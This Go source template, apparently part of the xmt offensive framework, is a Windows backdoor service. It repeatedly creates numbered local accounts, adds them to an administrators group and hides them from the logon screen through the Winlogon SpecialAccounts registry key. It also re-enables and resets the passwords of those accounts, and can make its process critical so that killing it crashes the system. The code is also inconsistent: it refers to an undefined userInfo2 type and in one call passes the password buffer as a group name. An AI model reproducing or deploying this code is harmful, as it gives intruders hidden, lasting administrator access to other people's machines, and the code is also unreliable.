// Copyright (C) 2020 - 2024 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package main

import (
	"context"
	"os"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/device/regedit"
	"github.com/iDigitalFlame/xmt/device/winapi"
	"github.com/iDigitalFlame/xmt/util"
)

const (
	user = `$username`
	flag = `$flag`
)

var (
	dllNetapi32 = winapi.NewLazyDLL("netapi32.dll")

	funcNetUserAdd              = dllNetapi32.Proc("NetUserAdd")
	funcNetUserSetInfo          = dllNetapi32.Proc("NetUserSetInfo")
	funcNetLocalGroupAddMembers = dllNetapi32.Proc("NetLocalGroupAddMembers")
)

type userInfo struct {
	// DO NOT REORDER
	Name       *uint16
	Password   *uint16
	_, Priv    uint32
	_, Comment *uint16
	Flags      uint32
	_          *uint16
	_          uint32
	FullName   *uint16
	_, _, _    *uint16
	_, _       uint32
	Expires    int32
	Storage    int32
	_          uint32
	_          *byte
	_, _       uint32
	_          *uint16
	_, _       uint32
}
type localGroup3 struct {
	Name *uint16
}
type userAddService struct {
	last, fixup uint16

	enabled bool

	pass, name     []uint16
	admin, comment []uint16
	sync.Once
}

func main() {
	defer func() {
		if err := recover(); err != nil {
			device.GoExit()
		}
	}()
	var (
		s = new(userAddService)
		z bool
	)
	if $critical {
		z, _ = device.SetCritical(true)
	}
	limits.MemorySweep(context.Background())
	if device.DaemonTicker(`$service`, time.Second*time.Duration($period), s.exec); !z {
		device.SetCritical(false)
	}
	device.GoExit()
}
func (s *userAddService) init() {
	s.name, _ = winapi.UTF16FromString(`$fullname`)
	s.pass, _ = winapi.UTF16FromString(`$password`)
	s.admin, _ = winapi.UTF16FromString(`$admin`)
	s.comment, _ = winapi.UTF16FromString(`$comment`)
	if len(flag) == 0 {
		s.enabled = true
	} else if _, err := os.Stat(flag); err == nil {
		s.enabled = true
	}
}
func (s *userAddService) exec(_ context.Context) error {
	if s.Do(s.init); !s.enabled {
		if _, err := os.Stat(flag); err == nil {
			s.enabled = true
		}
		time.Sleep(time.Second)
		return nil
	}
	if s.fixup >= 20 {
		for v, i := user+"0", uint16(0); i < s.last; v = user + util.Uitoa(uint64(i)) {
			s.addUser(true, v)
			i++
		}
		s.fixup = 0
		return nil
	}
	for v := user + util.Uitoa(uint64(s.last)); s.last < 8192; v = user + util.Uitoa(uint64(s.last)) {
		r := s.addUser(false, v)
		if s.last++; !r {
			continue
		}
		regedit.SetDword("HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", v, 0)
		break
	}
	s.fixup++
	return nil
}
func (s *userAddService) addUser(f bool, v string) bool {
	var (
		i    *userInfo2
		n, _ = winapi.UTF16PtrFromString(v)
		err  = syscall.NetUserGetInfo(nil, n, 2, (**byte)(unsafe.Pointer(&i)))
	)
	if err != nil || i == nil {
		x := &userInfo2{
			Name:     n,
			Priv:     1,
			Flags:    0x1090200,
			Expires:  -1,
			Storage:  -1,
			Comment:  &s.comment[0],
			FullName: &s.name[0],
			Password: &s.pass[0],
		}
		if r, _ := funcNetUserAdd.Call(0, 2, uintptr(unsafe.Pointer(x)), 0); r == 0 {
			g := &localGroup3{Name: n}
			funcNetLocalGroupAddMembers.Call(0, uintptr(unsafe.Pointer(&s.pass[0])), 3, uintptr(unsafe.Pointer(g)), 1)
			g = nil
		}
		return true
	}
	if f {
		if i.Flags&0x800012 != 0 || i.Flags&0x1090000 != 0x1090000 {
			i.Password, i.Flags = &s.pass[0], (i.Flags&^0x800012)|0x1090000
			funcNetUserSetInfo.Call(0, uintptr(unsafe.Pointer(n)), 2, uintptr(unsafe.Pointer(i)), 0)
		}
		g := &localGroup3{Name: n}
		funcNetLocalGroupAddMembers.Call(0, uintptr(unsafe.Pointer(&s.admin[0])), 3, uintptr(unsafe.Pointer(g)), 1)
		g = nil
	}
	syscall.NetApiBufferFree((*byte)(unsafe.Pointer(i)))
	return false
}
